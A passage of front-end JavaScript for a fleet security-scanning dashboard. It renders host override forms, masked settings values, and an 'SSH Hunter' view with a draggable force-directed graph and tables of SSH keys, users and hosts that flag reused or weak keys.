    state.checks = await api("/v1/checks");
    state.checkSets = await api("/v1/check-sets").catch(() => state.checkSets);
    if (state.selectedCheckId) {
      state.checkDetail = await api(`/v1/checks/${encodeURIComponent(state.selectedCheckId)}`);
    }
  }

  function hostSettingsFormHtml(hostId) {
    const h = state.hosts.find((x) => x.id === hostId);
    if (!h) {
      return `<div class="empty" style="padding:0.5rem 0">Pick a host to edit overrides</div>`;
    }
    const labels = h.labels || {};
    const timeouts = h.timeouts || {};
    const fleetSet = state.settings?.effective?.default_check_set || "standard";
    const fleetHistory = state.settings?.effective?.scan_history_per_host ?? 3;
    return `
      <form class="form" id="hostSettingsForm">
        <div class="form-row">
          <label>Preferred check set
            <select name="check_set">
              <option value="">Fleet default (${esc(fleetSet)})</option>
              ${CHECK_SETS.map((s) => `<option value="${esc(s.id)}" ${(labels.check_set || labels.default_check_set) === s.id ? "selected" : ""}>${esc(s.title)}</option>`).join("")}
            </select>
          </label>
          <label>Scan interval
            <select name="scan_interval">
              ${scanIntervalOptionsHtml(labels.scan_interval || "manual")}
            </select>
          </label>
          <label>Scan history keep
            <select name="scan_history">
              <option value="">Fleet default (${esc(String(fleetHistory))})</option>
              ${[1,3,5,10,20,50].map((v) => `<option value="${v}" ${String(labels.scan_history || labels.scan_history_per_host || "") === String(v) ? "selected" : ""}>${v}</option>`).join("")}
            </select>
          </label>
        </div>
        <div class="form-row">
          <label>Connect timeout (s)
            <input name="connect_timeout_secs" type="number" min="0" placeholder="fleet" value="${esc(timeouts.connect_timeout_secs ?? "")}" />
          </label>
          <label>Auth timeout (s)
            <input name="auth_timeout_secs" type="number" min="0" placeholder="fleet" value="${esc(timeouts.auth_timeout_secs ?? "")}" />
          </label>
          <label>Cmd timeout (s)
            <input name="cmd_timeout_secs" type="number" min="0" placeholder="fleet" value="${esc(timeouts.cmd_timeout_secs ?? "")}" />
          </label>
        </div>
        <div class="form-row">
          <label>Inactivity (s)
            <input name="inactivity_timeout_secs" type="number" min="0" placeholder="fleet" value="${esc(timeouts.inactivity_timeout_secs ?? "")}" />
          </label>
          <label>Delivery (s)
            <input name="delivery_timeout_secs" type="number" min="0" placeholder="fleet" value="${esc(timeouts.delivery_timeout_secs ?? "")}" />
          </label>
          <label>Scan timeout (s)
            <input name="scan_timeout_secs" type="number" min="0" placeholder="fleet" value="${esc(timeouts.scan_timeout_secs ?? "")}" />
          </label>
        </div>
        <div class="form-row">
          <label>Connect delay (ms)
            <input name="connect_delay_ms" type="number" min="0" value="${esc(timeouts.connect_delay_ms ?? "")}" />
          </label>
        </div>
        <div class="form-actions" style="justify-content:flex-start">
          <button class="btn primary" type="submit">Save host overrides</button>
          <button class="btn ghost" type="button" id="btnClearHostOverrides">Clear overrides</button>
        </div>
      </form>`;
  }

  function effectiveValue(key, eff) {
    if (!eff) return "—";
    const map = {
      listen: eff.listen,
      node_listen: eff.node_listen,
      checks: `${eff.checks_path} (${eff.checks_count} loaded)`,
      default_check_set: eff.default_check_set,
      scan_interval: eff.scan_interval,
      scan_jitter_pct: String(eff.scan_jitter_pct ?? "—"),
      max_concurrent_scans: String(eff.max_concurrent_scans ?? "—"),
      scan_timeout_secs: String(eff.scan_timeout_secs ?? "—"),
      scan_history_per_host: String(eff.scan_history_per_host ?? "3"),
      webhook_url: eff.webhook_configured ? (eff.webhook_url || "set") : "(unset)",
      webhook_secret: eff.webhook_secret_configured ? "•••••••• (set)" : "(unset)",
      seed_demo: String(!!eff.seed_demo),
      seed_hosts: String(eff.seed_hosts ?? "—"),
      scan_sim: String(!!eff.scan_sim),
      clickhouse_url: eff.clickhouse_configured ? (eff.clickhouse_url || "set") : "(unset)",
      clickhouse_user: eff.clickhouse_configured ? "(see env)" : "(unset)",
      clickhouse_password: eff.clickhouse_configured ? "••••••••" : "(unset)",
      noise_xx: eff.noise_xx_enabled
        ? `enabled · ${eff.noise_xx_server_fingerprint || ""}`
        : "disabled",
      api_token: eff.api_token_required ? "•••••••• (required)" : "(unset)",
      rust_log: eff.rust_log || "info (default)",
    };
    return map[key] ?? "—";
  }

  function sshLoading() {
    return `<section class="panel"><div class="empty">Loading SSH Hunter…</div></section>`;
  }

  function shortFp(fp) {
    const s = String(fp || "").replace(/^SHA256:/, "");
    return s.length > 18 ? `SHA256:${s.slice(0, 12)}…` : String(fp || "");
  }

  function selectedSshKeys() {
    return new Set(state._selectedSshKeys || []);
  }

  function setSelectedSshKeys(ids) {
    state._selectedSshKeys = [...ids];
  }

  function renderSshGraph(graph, opts) {
    const nodes = graph?.nodes || [];
    const edges = graph?.edges || [];
    if (!nodes.length) {
      return `<div class="empty">No graph data yet — run scans with ssh.keys collection.</div>`;
    }
    const tall = !!(opts && opts.tall);
    const rootId = (opts && opts.id) || "sshForce";
    return `
      <div class="ssh-force ${tall ? "ssh-force-tall" : ""}" data-ssh-force-root="${esc(rootId)}">
        <div class="ssh-force-toolbar">
          <div class="ssh-force-hint muted">Drag nodes · scroll zoom · pan empty space · click for details · Shift-drag to pin</div>
          <div class="ssh-force-actions">
            <label class="ssh-force-toggle"><input type="checkbox" data-ssh-force-show="key" checked /> Keys</label>
            <label class="ssh-force-toggle"><input type="checkbox" data-ssh-force-show="host" checked /> Hosts</label>
            <label class="ssh-force-toggle"><input type="checkbox" data-ssh-force-show="user" checked /> Users</label>
            <button type="button" class="btn ghost" data-ssh-force-act="relayout">Relayout</button>
            <button type="button" class="btn ghost" data-ssh-force-act="fit">Fit</button>
            <button type="button" class="btn ghost" data-ssh-force-act="unpin">Unpin all</button>
          </div>
        </div>
        <div class="ssh-force-stage">
          <canvas class="ssh-force-canvas" role="img" aria-label="SSH access graph"></canvas>
          <aside class="ssh-force-detail" data-ssh-force-detail hidden>
            <div class="ssh-force-detail-empty muted">Select a node</div>
          </aside>
        </div>
        <div class="ssh-legend">
          <span><i style="background:var(--accent)"></i>Keys</span>
          <span><i style="background:#3b82f6"></i>Hosts</span>
          <span><i style="background:var(--warn)"></i>Users</span>
          <span class="muted">${nodes.length} nodes · ${edges.length} edges</span>
        </div>
      </div>`;
  }

  function sshGraphPage() {
    if (!state.ssh) return sshLoading();
    const g = state.ssh.graph || {};
    const n = (g.nodes || []).length;
    const e = (g.edges || []).length;
    return `
      <section class="panel">
        <div class="panel-head">
          <h3>Key · user · host access graph</h3>
          <div class="row" style="gap:0.5rem">
            <span class="muted">${n} nodes · ${e} edges</span>
            <button class="btn ghost" data-goto="ssh-keys">Investigate keys</button>
            <button class="btn ghost" type="button" id="btnSshGraphRefresh">Refresh</button>
          </div>
        </div>
        <div style="padding:0.85rem 1.1rem">${renderSshGraph(state.ssh.graph, { tall: true, id: "sshForcePage" })}</div>
      </section>`;
  }

  function sshSummary() {
    if (!state.ssh) return sshLoading();
    const s = state.ssh.summary || {};
    const types = Object.entries(s.key_types || {});
    return `
      <div class="stats">
        <div class="stat"><div class="label">SSH keys</div><div class="value">${(s.keys ?? 0).toLocaleString()}</div><div class="hint">${s.placements ?? 0} placements</div></div>
        <div class="stat crit"><div class="label">Reused keys</div><div class="value">${s.reused_keys ?? 0}</div><div class="hint">cross-host / lateral risk</div></div>
        <div class="stat warn"><div class="label">Weak / legacy</div><div class="value">${s.weak_keys ?? 0}</div><div class="hint">${s.tagged_keys ?? 0} tagged</div></div>
        <div class="stat"><div class="label">Users · hosts</div><div class="value">${s.users ?? 0} · ${s.hosts_with_keys ?? 0}</div><div class="hint">${s.zones ?? 0} security zones</div></div>
      </div>
      <div class="ssh-graph" style="margin-bottom:1rem">
        <section class="panel">
          <div class="panel-head">
            <h3>Key · user · host graph</h3>
            <button class="btn ghost" data-goto="ssh-graph">Open full graph</button>
          </div>
          <div style="padding:0.85rem 1.1rem">${renderSshGraph(state.ssh.graph, { id: "sshForceSummary" })}</div>
        </section>
        <section class="panel">
          <div class="panel-head"><h3>Key types</h3></div>
          ${!types.length ? `<div class="empty">No keys indexed</div>` : profileBars(Object.fromEntries(types))}
          <div class="panel-head" style="border-top:1px solid var(--line)"><h3>Top reused</h3></div>
          ${sshKeysTable((s.top_reused || []).slice(0, 8), false)}
        </section>
      </div>
      <section class="panel">
        <div class="panel-head"><h3>Recently seen keys</h3><button class="btn ghost" data-goto="ssh-tags">Tag workbench</button></div>
        ${sshKeysTable(s.recent_keys || [], false)}
      </section>`;
  }

  function cssVar(name, fallback) {
    const v = getComputedStyle(document.documentElement).getPropertyValue(name).trim();
    return v || fallback;
  }

  function createSshForceGraph(root, graph) {
    const canvas = root.querySelector(".ssh-force-canvas");
    const detail = root.querySelector("[data-ssh-force-detail]");
    const stage = root.querySelector(".ssh-force-stage");
    if (!canvas || !stage) return null;
    const ctx = canvas.getContext("2d");

    const idIndex = new Map();
    const nodes = (graph?.nodes || []).map((n, i) => {
      idIndex.set(n.id, i);
      const kind = n.kind || "key";
      return {
        id: n.id,
        kind,
        label: String(n.label || n.id),
        meta: n.meta || {},
        x: 0,
        y: 0,
        vx: 0,
        vy: 0,
        pinned: false,
        r: kind === "host" ? 14 : kind === "user" ? 12 : 11,
      };
    });
    const links = [];
    const neighbors = new Map(nodes.map((n) => [n.id, new Set()]));
    for (const e of graph?.edges || []) {
      const si = idIndex.get(e.from);
      const ti = idIndex.get(e.to);
      if (si == null || ti == null) continue;
      links.push({
        source: si,
        target: ti,
        role: e.role || "",
        username: e.username || "",
      });
      neighbors.get(nodes[si].id).add(nodes[ti].id);
      neighbors.get(nodes[ti].id).add(nodes[si].id);
    }

    const show = { key: true, host: true, user: true };
    let selected = null;
    let transform = { x: 0, y: 0, k: 1 };
    let dragging = null;
    let panning = null;
    let moved = false;
    let raf = 0;
    let running = false;
    let alpha = 1;
    let disposed = false;
    let lastW = 0;
    let lastH = 0;
    let settleFrames = 0;

    const colors = {
      key: cssVar("--accent", "#e85d4c"),
      host: "#3b82f6",
      user: cssVar("--warn", "#d4a017"),
      edge: "rgba(100,112,130,0.4)",
      edgeHot: "rgba(100,112,130,0.85)",
      edgeHost: "rgba(100,112,130,0.22)",
      ink: cssVar("--ink", "#1a1d23"),
      soft: cssVar("--ink-soft", "#6b7280"),
      panel: cssVar("--panel", "#fff"),
    };

    function visible(n) {
      return !!show[n.kind];
    }

    function isHot(n) {
      if (!selected) return true;
      if (n.id === selected.id) return true;
      return neighbors.get(selected.id)?.has(n.id);
    }

    function seedLayout() {
      const w = Math.max(stage.clientWidth, 360);
      const h = Math.max(stage.clientHeight, 280);
      const cols = { key: [], user: [], host: [] };
      nodes.forEach((n) => (cols[n.kind] || cols.key).push(n));
      const stack = (list, x, spread) => {
        const n = list.length;
        if (!n) return;
        const gap = Math.min(spread, (h * 0.72) / Math.max(n, 1));
        const start = h / 2 - ((n - 1) * gap) / 2;
        list.forEach((node, i) => {
          node.x = x + (Math.random() - 0.5) * 12;
          node.y = start + i * gap + (Math.random() - 0.5) * 8;
          node.vx = 0;
          node.vy = 0;
          node.pinned = false;
        });
      };
      stack(cols.key, w * 0.22, 56);
      stack(cols.user, w * 0.5, 64);
      stack(cols.host, w * 0.78, 72);
      alpha = 1;
      settleFrames = 0;
    }

    function tick() {
      if (disposed) return;
      raf = 0;
      const vis = nodes.filter(visible);
      if (!vis.length) {
        draw();
        return;
      }

      // Repulsion (Barnes–Hut not needed for small graphs)
      const repulsion = 2800;
      for (let i = 0; i < vis.length; i++) {
        const a = vis[i];
        for (let j = i + 1; j < vis.length; j++) {
          const b = vis[j];
          let dx = a.x - b.x;
          let dy = a.y - b.y;
          let dist2 = dx * dx + dy * dy;
          if (dist2 < 0.01) {
            dx = (Math.random() - 0.5) * 0.5;
            dy = (Math.random() - 0.5) * 0.5;
            dist2 = dx * dx + dy * dy;
          }
          const dist = Math.sqrt(dist2);
          const f = (repulsion * alpha) / dist2;
          const fx = (dx / dist) * f;
          const fy = (dy / dist) * f;
          if (!a.pinned) { a.vx += fx; a.vy += fy; }
          if (!b.pinned) { b.vx -= fx; b.vy -= fy; }
        }
      }

      // Link springs — shorter for host-key edges
      for (const link of links) {
        const a = nodes[link.source];
        const b = nodes[link.target];
        if (!visible(a) || !visible(b)) continue;
        const dx = b.x - a.x;
        const dy = b.y - a.y;
        const dist = Math.sqrt(dx * dx + dy * dy) || 0.01;
        const rest = link.role === "host" ? 70 : 110;
        const strength = 0.045 * alpha;
        const f = (dist - rest) * strength;
        const fx = (dx / dist) * f;
        const fy = (dy / dist) * f;
        if (!a.pinned) { a.vx += fx; a.vy += fy; }
        if (!b.pinned) { b.vx -= fx; b.vy -= fy; }
      }

      // Soft gravity toward layered targets (keeps key/user/host readable)
      const w = Math.max(stage.clientWidth, 1);
      const h = Math.max(stage.clientHeight, 1);
      const targetX = { key: w * 0.22, user: w * 0.5, host: w * 0.78 };
      for (const a of vis) {
        if (a.pinned) continue;
        const tx = targetX[a.kind] ?? w * 0.5;
        a.vx += (tx - a.x) * 0.012 * alpha;
        a.vy += (h * 0.5 - a.y) * 0.004 * alpha;
      }

      let maxV = 0;
      for (const a of vis) {
        if (a.pinned) {
          a.vx = 0;
          a.vy = 0;
          continue;
        }
        a.vx *= 0.78;
        a.vy *= 0.78;
        const speed = Math.hypot(a.vx, a.vy);
        if (speed > 18) {
          a.vx = (a.vx / speed) * 18;
          a.vy = (a.vy / speed) * 18;
        }
        a.x += a.vx;
        a.y += a.vy;
        maxV = Math.max(maxV, Math.abs(a.vx), Math.abs(a.vy));
      }

      alpha *= 0.988;
      settleFrames += 1;
      draw();

      running = alpha > 0.015 && maxV > 0.04 && settleFrames < 600;
      if (running) raf = requestAnimationFrame(tick);
      else if (settleFrames < 8) {
        // one extra quiet redraw after settle
        running = false;
      }
    }

    function resume(boost) {
      if (disposed) return;
      alpha = Math.max(alpha, boost == null ? 0.45 : boost);
      settleFrames = 0;
      if (!raf) {
        running = true;
        raf = requestAnimationFrame(tick);
      }
    }

    function screenToWorld(sx, sy) {
      return {
        x: (sx - transform.x) / transform.k,
        y: (sy - transform.y) / transform.k,
      };
    }

    function hitTest(sx, sy) {
      const wpt = screenToWorld(sx, sy);
      // Constant ~14px screen padding so zoomed-out nodes stay grabable
      const pad = 14 / transform.k;
      let best = null;
      let bestD = Infinity;
      for (const n of nodes) {
        if (!visible(n)) continue;
        const d = Math.hypot(n.x - wpt.x, n.y - wpt.y);
        if (d <= n.r + pad && d < bestD) {
          best = n;
          bestD = d;
        }
      }
      return best;
    }

    function resize(opts) {
      const dpr = Math.min(window.devicePixelRatio || 1, 2);
      const w = Math.max(stage.clientWidth, 1);
      const h = Math.max(stage.clientHeight, 1);
      const sizeChanged = Math.abs(w - lastW) > 2 || Math.abs(h - lastH) > 2;
      const first = lastW === 0;
      canvas.width = Math.floor(w * dpr);
      canvas.height = Math.floor(h * dpr);
      canvas.style.width = `${w}px`;
      canvas.style.height = `${h}px`;
      ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
      if ((first || (opts && opts.reseed)) && w > 40 && h > 40) {
        seedLayout();
        fitView();
        resume(1);
      } else if (sizeChanged && !first) {
        fitView();
      } else {
        draw();
      }
      lastW = w;
      lastH = h;
    }

    function draw() {
      const w = Math.max(stage.clientWidth, 1);
      const h = Math.max(stage.clientHeight, 1);
      ctx.clearRect(0, 0, w, h);
      ctx.save();
      ctx.translate(transform.x, transform.y);
      ctx.scale(transform.k, transform.k);

      for (const link of links) {
        const a = nodes[link.source];
        const b = nodes[link.target];
        if (!visible(a) || !visible(b)) continue;
        const linkedToSel = selected && (a.id === selected.id || b.id === selected.id);
        ctx.beginPath();
        ctx.moveTo(a.x, a.y);
        ctx.lineTo(b.x, b.y);
        if (selected && !linkedToSel) {
          ctx.globalAlpha = 0.12;
          ctx.strokeStyle = colors.edge;
        } else {
          ctx.globalAlpha = linkedToSel ? 1 : 0.9;
          ctx.strokeStyle = linkedToSel ? colors.edgeHot : (link.role === "host" ? colors.edgeHost : colors.edge);
        }
        ctx.lineWidth = (linkedToSel ? 2 : 1.25) / transform.k;
        if (link.role === "host") ctx.setLineDash([4 / transform.k, 4 / transform.k]);
        else ctx.setLineDash([]);
        ctx.stroke();
        ctx.setLineDash([]);
        ctx.globalAlpha = 1;
      }

      // Draw unselected first, selected on top
      const order = nodes.filter(visible).sort((a, b) => {
        const as = selected && a.id === selected.id ? 1 : 0;
        const bs = selected && b.id === selected.id ? 1 : 0;
        return as - bs;
      });
      for (const n of order) {
        const hot = isHot(n);
        const isSel = selected && selected.id === n.id;
        ctx.globalAlpha = selected && !hot ? 0.18 : 1;
        ctx.beginPath();
        ctx.arc(n.x, n.y, n.r, 0, Math.PI * 2);
        ctx.fillStyle = colors[n.kind] || colors.key;
        ctx.fill();
        ctx.lineWidth = (isSel ? 2.5 : 1.2) / transform.k;
        ctx.strokeStyle = isSel ? colors.ink : "rgba(0,0,0,0.18)";
        ctx.stroke();

        // Kind glyph
        ctx.fillStyle = "#fff";
        ctx.font = `600 ${Math.max(9, 10 / transform.k)}px ui-sans-serif, system-ui, sans-serif`;
        ctx.textAlign = "center";
        ctx.textBaseline = "middle";
        const glyph = n.kind === "host" ? "H" : n.kind === "user" ? "U" : "K";
        ctx.fillText(glyph, n.x, n.y + 0.5);

        const label = n.label.length > 24 ? `${n.label.slice(0, 22)}…` : n.label;
        ctx.font = `${12 / transform.k}px ui-sans-serif, system-ui, sans-serif`;
        ctx.fillStyle = colors.soft;
        ctx.textBaseline = "top";
        ctx.globalAlpha = selected && !hot ? 0.15 : 1;
        ctx.fillText(label, n.x, n.y + n.r + 4 / transform.k);
        ctx.globalAlpha = 1;
      }
      ctx.restore();
    }

    function renderDetail(n) {
      if (!detail) return;
      if (!n) {
        detail.hidden = true;
        detail.innerHTML = `<div class="ssh-force-detail-empty muted">Select a node</div>`;
        return;
      }
      detail.hidden = false;
      const meta = n.meta || {};
      const deg = neighbors.get(n.id)?.size || 0;
      if (n.kind === "key") {
        const fp = meta.fingerprint || String(n.id).replace(/^key:/, "");
        const tags = (meta.tags || []).map((t) => `<span class="tag">${esc(t)}</span>`).join(" ") || "—";
        detail.innerHTML = `
          <div class="ssh-force-detail-kind">Key · ${deg} links</div>
          <div class="ssh-force-detail-title">${esc(n.label)}</div>
          <dl class="ssh-force-dl">
            <dt>Fingerprint</dt><dd class="mono">${esc(shortFp(fp))}</dd>
            <dt>Type</dt><dd>${esc(meta.key_type || "—")}</dd>
            <dt>Tags</dt><dd>${tags}</dd>
          </dl>
          <button type="button" class="btn" data-ssh-force-open-key="${esc(fp)}">Investigate key</button>`;
      } else if (n.kind === "host") {
        const hid = meta.host_id || String(n.id).replace(/^host:/, "");
        detail.innerHTML = `
          <div class="ssh-force-detail-kind">Host · ${deg} keys</div>
          <div class="ssh-force-detail-title">${esc(n.label)}</div>
          <dl class="ssh-force-dl">
            <dt>Address</dt><dd class="mono">${esc(meta.addr || meta.address || "—")}</dd>
            <dt>Host ID</dt><dd class="mono">${esc(String(hid).slice(0, 13))}…</dd>
          </dl>
          <button type="button" class="btn" data-ssh-force-open-host="${esc(hid)}">Open host</button>`;
      } else {
        const user = meta.username || n.label;
        detail.innerHTML = `
          <div class="ssh-force-detail-kind">User · ${deg} keys</div>
          <div class="ssh-force-detail-title">${esc(user)}</div>
          <p class="muted" style="margin:0.4rem 0 0.8rem">Account holding authorized keys on linked hosts.</p>
          <button type="button" class="btn ghost" data-goto="ssh-users">User investigation</button>`;
      }
      detail.querySelector("[data-ssh-force-open-key]")?.addEventListener("click", (ev) => {
        showSshKeyDetail(ev.currentTarget.getAttribute("data-ssh-force-open-key"));
      });
      detail.querySelector("[data-ssh-force-open-host]")?.addEventListener("click", (ev) => {
        openHostById(ev.currentTarget.getAttribute("data-ssh-force-open-host"));
      });
      detail.querySelector("[data-goto]")?.addEventListener("click", (ev) => {
        setView(ev.currentTarget.dataset.goto);
      });
    }

    function selectNode(n) {
      selected = n;
      renderDetail(n);
      draw();
    }

    function fitView() {
      const vis = nodes.filter(visible);
      if (!vis.length) return;
      let minX = Infinity;
      let minY = Infinity;
      let maxX = -Infinity;
      let maxY = -Infinity;
      for (const n of vis) {
        minX = Math.min(minX, n.x - n.r - 20);
        minY = Math.min(minY, n.y - n.r - 8);
        maxX = Math.max(maxX, n.x + n.r + 20);
        maxY = Math.max(maxY, n.y + n.r + 22);
      }
      const bw = Math.max(maxX - minX, 80);
      const bh = Math.max(maxY - minY, 80);
      const w = Math.max(stage.clientWidth, 1);
      const h = Math.max(stage.clientHeight, 1);
      const pad = 56;
      const k = Math.min(1.85, Math.max(0.45, Math.min((w - pad * 2) / bw, (h - pad * 2) / bh)));
      transform.k = k;
      transform.x = w / 2 - k * (minX + bw / 2);
      transform.y = h / 2 - k * (minY + bh / 2);
      draw();
    }

    function onPointerDown(e) {
      if (e.button != null && e.button !== 0) return;
      const rect = canvas.getBoundingClientRect();
      const sx = e.clientX - rect.left;
      const sy = e.clientY - rect.top;
      moved = false;
      const hit = hitTest(sx, sy);
      if (hit) {
        dragging = {
          node: hit,
          wasPinned: hit.pinned,
        };
        hit.pinned = true;
        selectNode(hit);
        canvas.setPointerCapture(e.pointerId);
        canvas.style.cursor = "grabbing";
        resume(0.35);
      } else {
        panning = { x: sx, y: sy, tx: transform.x, ty: transform.y };
        canvas.setPointerCapture(e.pointerId);
        canvas.style.cursor = "grabbing";
      }
    }

    function onPointerMove(e) {
      const rect = canvas.getBoundingClientRect();
      const sx = e.clientX - rect.left;
      const sy = e.clientY - rect.top;
      if (dragging) {
        const wpt = screenToWorld(sx, sy);
        dragging.node.x = wpt.x;
        dragging.node.y = wpt.y;
        dragging.node.vx = 0;
        dragging.node.vy = 0;
        moved = true;
        resume(0.25);
        draw();
      } else if (panning) {
        const dx = sx - panning.x;
        const dy = sy - panning.y;
        if (Math.hypot(dx, dy) > 3) moved = true;
        transform.x = panning.tx + dx;
        transform.y = panning.ty + dy;
        draw();
      } else {
        canvas.style.cursor = hitTest(sx, sy) ? "pointer" : "grab";
      }
    }

    function onPointerUp(e) {
      if (dragging) {
        // Stay where dropped but un-pin so layout can breathe (Shift keeps pin)
        if (!e.shiftKey) dragging.node.pinned = false;
        dragging = null;
        resume(0.4);
      } else if (panning) {
        if (!moved) selectNode(null);
        panning = null;
      }
      canvas.style.cursor = "grab";
    }

    function onWheel(e) {
      e.preventDefault();
      const rect = canvas.getBoundingClientRect();
      const sx = e.clientX - rect.left;
      const sy = e.clientY - rect.top;
      const before = screenToWorld(sx, sy);
      const factor = Math.exp((-e.deltaY) * 0.0015);
      transform.k = Math.min(3.5, Math.max(0.3, transform.k * factor));
      transform.x = sx - before.x * transform.k;
      transform.y = sy - before.y * transform.k;
      draw();
    }

    function onDblClick(e) {
      const rect = canvas.getBoundingClientRect();
      const hit = hitTest(e.clientX - rect.left, e.clientY - rect.top);
      if (!hit) {
        fitView();
        return;
      }
      if (hit.kind === "key") {
        showSshKeyDetail(hit.meta?.fingerprint || String(hit.id).replace(/^key:/, ""));
      } else if (hit.kind === "host") {
        openHostById(hit.meta?.host_id || String(hit.id).replace(/^host:/, ""));
      } else {
        setView("ssh-users");
      }
    }

    root.querySelectorAll("[data-ssh-force-show]").forEach((cb) => {
      cb.addEventListener("change", () => {
        show[cb.getAttribute("data-ssh-force-show")] = cb.checked;
        if (selected && !visible(selected)) selectNode(null);
        fitView();
        resume(0.6);
      });
    });
    root.querySelectorAll("[data-ssh-force-act]").forEach((btn) => {
      btn.addEventListener("click", () => {
        const act = btn.getAttribute("data-ssh-force-act");
        if (act === "relayout") {
          seedLayout();
          fitView();
          resume(1);
        } else if (act === "fit") {
          fitView();
        } else if (act === "unpin") {
          nodes.forEach((n) => { n.pinned = false; });
          resume(0.5);
        }
      });
    });

    canvas.addEventListener("pointerdown", onPointerDown);
    canvas.addEventListener("pointermove", onPointerMove);
    canvas.addEventListener("pointerup", onPointerUp);
    canvas.addEventListener("pointercancel", onPointerUp);
    canvas.addEventListener("wheel", onWheel, { passive: false });
    canvas.addEventListener("dblclick", onDblClick);
    canvas.style.touchAction = "none";
    canvas.style.cursor = "grab";

    const ro = typeof ResizeObserver !== "undefined"
      ? new ResizeObserver(() => { resize(); })
      : null;
    if (ro) ro.observe(stage);

    // Defer first layout to next frame so CSS height is resolved
    requestAnimationFrame(() => {
      if (disposed) return;
      resize({ reseed: true });
    });

    return {
      destroy() {
        disposed = true;
        running = false;
        if (raf) cancelAnimationFrame(raf);
        if (ro) ro.disconnect();
        canvas.removeEventListener("pointerdown", onPointerDown);
        canvas.removeEventListener("pointermove", onPointerMove);
        canvas.removeEventListener("pointerup", onPointerUp);
        canvas.removeEventListener("pointercancel", onPointerUp);
        canvas.removeEventListener("wheel", onWheel);
        canvas.removeEventListener("dblclick", onDblClick);
      },
    };
  }

  function mountSshForceGraphs() {
    $$("[data-ssh-force-root]").forEach((el) => {
      if (el._sshForce && el._sshForce.destroy) {
        try { el._sshForce.destroy(); } catch (_) {}
        el._sshForce = null;
      }
      if (!state.ssh?.graph?.nodes?.length) return;
      el._sshForce = createSshForceGraph(el, state.ssh.graph);
    });
  }

  function sshKeysTable(rows, selectable) {
    const sel = selectedSshKeys();
    if (!rows.length) return `<div class="empty">No keys match</div>`;
    return `<table class="data"><thead><tr>
      ${selectable ? `<th class="col-check"></th>` : ""}
      <th>Fingerprint</th><th>Type</th><th>Comment</th><th>Hosts</th><th>Users</th><th>Tags</th><th>Flags</th>
    </tr></thead><tbody>
      ${rows.map((k) => `<tr data-ssh-key="${esc(k.fingerprint)}">
        ${selectable ? `<td class="col-check" data-stop><input type="checkbox" data-ssh-check="${esc(k.fingerprint)}" ${sel.has(k.fingerprint) ? "checked" : ""} /></td>` : ""}
        <td class="mono"><button type="button" class="linkish" data-ssh-key-detail="${esc(k.fingerprint)}">${esc(shortFp(k.fingerprint))}</button></td>
        <td>${esc(k.key_type)}</td>
        <td>${esc(k.comment || "—")}</td>
        <td>${k.host_count ?? 0}</td>
        <td>${k.user_count ?? 0}</td>
        <td>${(k.tags || []).map((t) => `<span class="tag">${esc(t)}</span>`).join(" ") || "—"}</td>
        <td>
          ${k.reused ? `<span class="host-status ssh-pill-reused">reused</span>` : ""}
          ${k.weak ? `<span class="host-status ssh-pill-weak">weak</span>` : ""}
        </td>
      </tr>`).join("")}
    </tbody></table>`;
  }

  function filteredSshKeys() {
    const q = (state._sshKeyQ || "").toLowerCase();
    const tag = state._sshKeyTag || "";
    const reused = !!state._sshKeyReused;
    const weak = !!state._sshKeyWeak;
    return (state.ssh?.keys || []).filter((k) => {
      if (reused && !k.reused) return false;
      if (weak && !k.weak) return false;
      if (tag && !(k.tags || []).includes(tag)) return false;
      if (!q) return true;
      const hay = `${k.fingerprint} ${k.key_type} ${k.comment || ""} ${(k.tags || []).join(" ")}`.toLowerCase();
      return hay.includes(q);
    });
  }

  function sshKeys() {
    if (!state.ssh) return sshLoading();
    const tags = state.ssh.tags || [];
    const rows = filteredSshKeys();
    return `<section class="panel">
      <div class="panel-head">
        <h3>Key Investigation <span class="muted">(${rows.length.toLocaleString()})</span></h3>
        <div class="toolbar">
          <input id="sshKeyQ" placeholder="Search fingerprint, comment, tag…" value="${esc(state._sshKeyQ || "")}" />
          <select id="sshKeyTag">
            <option value="">All tags</option>
            ${tags.map((t) => `<option value="${esc(t)}" ${state._sshKeyTag === t ? "selected" : ""}>${esc(t)}</option>`).join("")}
          </select>
          <label class="muted" style="display:flex;align-items:center;gap:0.35rem;font-size:0.82rem">
            <input type="checkbox" id="sshKeyReused" ${state._sshKeyReused ? "checked" : ""} /> Reused
          </label>
          <label class="muted" style="display:flex;align-items:center;gap:0.35rem;font-size:0.82rem">
            <input type="checkbox" id="sshKeyWeak" ${state._sshKeyWeak ? "checked" : ""} /> Weak
          </label>
        </div>
      </div>
      ${sshKeysTable(rows.slice(0, 500), false)}
    </section>`;
  }

  function sshUsers() {
    if (!state.ssh) return sshLoading();
    const q = (state._sshUserQ || "").toLowerCase();
    const rows = (state.ssh.users || []).filter((u) => !q || u.username.toLowerCase().includes(q));
    return `<section class="panel">
      <div class="panel-head">
        <h3>User Investigation <span class="muted">(${rows.length.toLocaleString()})</span></h3>
        <div class="toolbar">
          <input id="sshUserQ" placeholder="Search username…" value="${esc(state._sshUserQ || "")}" />
        </div>
      </div>
      ${!rows.length ? `<div class="empty">No users with authorized keys</div>` : `
      <table class="data"><thead><tr>
        <th>User</th><th>Keys</th><th>Hosts</th><th>Fingerprints</th>
      </tr></thead><tbody>
        ${rows.slice(0, 500).map((u) => `<tr data-ssh-user="${esc(u.username)}">
          <td><strong>${esc(u.username)}</strong></td>
          <td>${u.key_count}</td>
          <td>${u.host_count}</td>
          <td class="mono">${(u.fingerprints || []).slice(0, 4).map((f) =>
            `<button type="button" class="linkish" data-ssh-key-detail="${esc(f)}">${esc(shortFp(f))}</button>`
          ).join(" · ")}${(u.fingerprints || []).length > 4 ? " …" : ""}</td>
        </tr>`).join("")}
      </tbody></table>`}
    </section>`;
  }

  function sshHostsView() {
    if (!state.ssh) return sshLoading();
    const q = (state._sshHostQ || "").toLowerCase();
    const rows = (state.ssh.hosts || []).filter((h) => {
      if (!q) return true;
      return `${h.display_name} ${h.primary_addr || ""} ${(h.usernames || []).join(" ")}`.toLowerCase().includes(q);
    });
    return `<section class="panel">
      <div class="panel-head">
        <h3>Host Investigation <span class="muted">(${rows.length.toLocaleString()})</span></h3>
        <div class="toolbar">
          <input id="sshHostQ" placeholder="Search host…" value="${esc(state._sshHostQ || "")}" />
        </div>
      </div>
      ${!rows.length ? `<div class="empty">No hosts with SSH keys</div>` : `
      <table class="data"><thead><tr>
        <th>Host</th><th>Address</th><th>Keys</th><th>Users</th><th>Profiles</th>
      </tr></thead><tbody>
        ${rows.slice(0, 500).map((h) => `<tr>
